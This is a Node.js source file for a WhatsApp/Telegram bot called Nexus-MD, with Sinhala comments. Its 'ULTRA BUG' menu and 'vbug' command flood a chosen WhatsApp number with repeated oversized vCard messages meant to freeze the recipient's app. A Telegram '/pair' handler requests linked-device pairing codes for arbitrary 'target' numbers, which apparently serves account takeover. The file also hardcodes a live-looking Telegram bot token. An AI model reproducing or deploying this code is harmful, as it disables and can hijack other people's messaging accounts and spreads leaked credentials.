const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion,
    DisconnectReason,
    getContentType,
    Browsers
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require("pino");
const fs = require("fs");

// --- [ CONFIGURATION ] ---
const tgToken = '8628876949:AAGE8DNJIpOaaD3akR4MRaLfNjd3aN-tP_4';
const ownerNumber = "94770475809";
const prefix = ".";

const tgBot = new TelegramBot(tgToken, { polling: true });

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        // කෝඩ් එක එන්න නම් අනිවාර්යයෙන්ම Browser එක Desktop වෙන්න ඕනේ
        browser: Browsers.macOS("Desktop") 
    });

    sock.ev.on('creds.update', saveCreds);

    // --- [ 🛠️ TELEGRAM PUBLIC PAIRING FIX ] ---
    tgBot.on('message', async (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text;

        if (!text) return;

        if (text === '/start') {
            const welcome = `👋 *Welcome to Nexus-MD Hybrid System!*\n\n` +
                            `WhatsApp Pairing Code එකක් ගන්න පහත විදිහට ටයිප් කරන්න:\n\n` +
                            `👉 \`/pair 947xxxxxxxx\` \n\n` +
                            `🚀 *Created by Sasiya MD*`;
            return tgBot.sendMessage(chatId, welcome, { parse_mode: "Markdown" });
        }

        if (text.startsWith('/pair ')) {
            let target = text.replace('/pair ', '').replace(/[^0-9]/g, '');
            if (target.length < 10) return tgBot.sendMessage(chatId, "❌ නම්බර් එක වැරදියි මචං!");

            await tgBot.sendMessage(chatId, `⏳ *${target}* සඳහා කෝඩ් එක රික්වෙස්ට් කරනවා... ප්ලීස් තත්පර 8ක් ඉන්න.`);

            try {
                const tempDir = `./temp_${target}`;
                const { state: tState } = await useMultiFileAuthState(tempDir);
                
                const tSock = makeWASocket({
                    auth: tState,
                    logger: pino({ level: "silent" }),
                    browser: Browsers.macOS("Desktop")
                });

                // වැදගත්ම කොටස: WhatsApp සර්වර් එකට කනෙක්ට් වෙන්න වෙලාව දෙනවා
                setTimeout(async () => {
                    try {
                        let code = await tSock.requestPairingCode(target);
                        if (code) {
                            let formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
                            const res = `🔥 *NEXUS-MD PAIRING SUCCESS*\n\n` +
                                        `📍 *Target:* ${target}\n` +
                                        `🔑 *Code:* \`${formattedCode}\` \n\n` +
                                        `මේ කෝඩ් එක WhatsApp -> Linked Devices වල ගහපන් මචං.`;
                            
                            await tgBot.sendMessage(chatId, res, { parse_mode: "Markdown" });
                            console.log(`✅ Code Sent: ${formattedCode}`);
                        }
                    } catch (e) {
                        tgBot.sendMessage(chatId, "❌ කෝඩ් එක ජෙනරේට් වුණේ නැහැ. නම්බර් එක චෙක් කරලා ආයෙ ට්‍රයි කරන්න.");
                    } finally {
                        setTimeout(() => { if (fs.existsSync(tempDir)) fs.rmSync(tempDir, { recursive: true, force: true }); }, 20000);
                    }
                }, 8000); // Wait for connection stability

            } catch (err) { tgBot.sendMessage(chatId, "❌ System Error!"); }
        }
    });

    // --- [ 💀 ULTRA BUG MENU & ATTACK SYSTEM ] ---
    sock.ev.on('messages.upsert', async (chat) => {
        const msg = chat.messages[0];
        if (!msg.message || msg.key.fromMe) return;
        const from = msg.key.remoteJid;
        const type = getContentType(msg.message);
        const body = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : '';
        
        if (!body.startsWith(prefix)) return;
        const command = body.slice(prefix.length).trim().split(' ')[0].toLowerCase();
        const args = body.trim().split(/ +/).slice(1);

        // --- LOKU MENU ---
        if (command === 'menu') {
            const menu = `
⚡ *NEXUS-MD V5.2 ULTRA BUG MENU* ⚡
 
👋 *Hello Sasiya MD!*
🛡️ *Status:* Hybrid Online ✅

*─── [ 🔗 PUBLIC PAIRING ] ───*
◈ Telegram: /pair [number]
◈ Bot Token: Active ✅

*─── [ 💀 ULTRA BUG ATTACKS ] ───*
◈ ${prefix}vbug - Vcard Mega Crash ⚰️
◈ ${prefix}cbug - Char Overflow Bug
◈ ${prefix}lbug - Location Freeze
◈ ${prefix}crash - System Total Freeze

*─── [ 🛠️ TOOLS ] ───*
◈ ${prefix}ping - Speed Test
◈ ${prefix}status - System Info
◈ ${prefix}reboot - Restart

🚀 *Powered by Developer Nexus*
            `;
            await sock.sendMessage(from, { 
                text: menu,
                contextInfo: {
                    externalAdReply: {
                        title: "NEXUS-MD ULTIMATE",
                        body: "Created by Sasiya MD",
                        thumbnailUrl: "https://files.catbox.moe/6v0m3q.jpg",
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            });
        }

        // Vcard Bug Attack
        if (command === 'vbug') {
            let target = args[0] ? args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from;
            const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:NEXUS CRASH ⚰️\n' + 'TEL;waid=94770475809:+94770475809\n' + 'END:VCARD'.repeat(400);
            await sock.sendMessage(from, { text: "💀 Vcard Mega Attack Starting..." });
            for (let i = 0; i < 15; i++) {
                await sock.sendMessage(target, { contacts: { displayName: 'NEXUS CRASH', contacts: [{ vcard }] } });
                await new Promise(r => setTimeout(r, 600));
            }
            sock.sendMessage(from, { text: "✅ Done! Target Freezed." });
        }
    });

    sock.ev.on('connection.update', (update) => {
        const { connection } = update;
        if (connection === 'open') console.log('✅ Nexus-MD Hybrid Online!');
        if (connection === 'close') startNexus();
    });
}

startNexus();
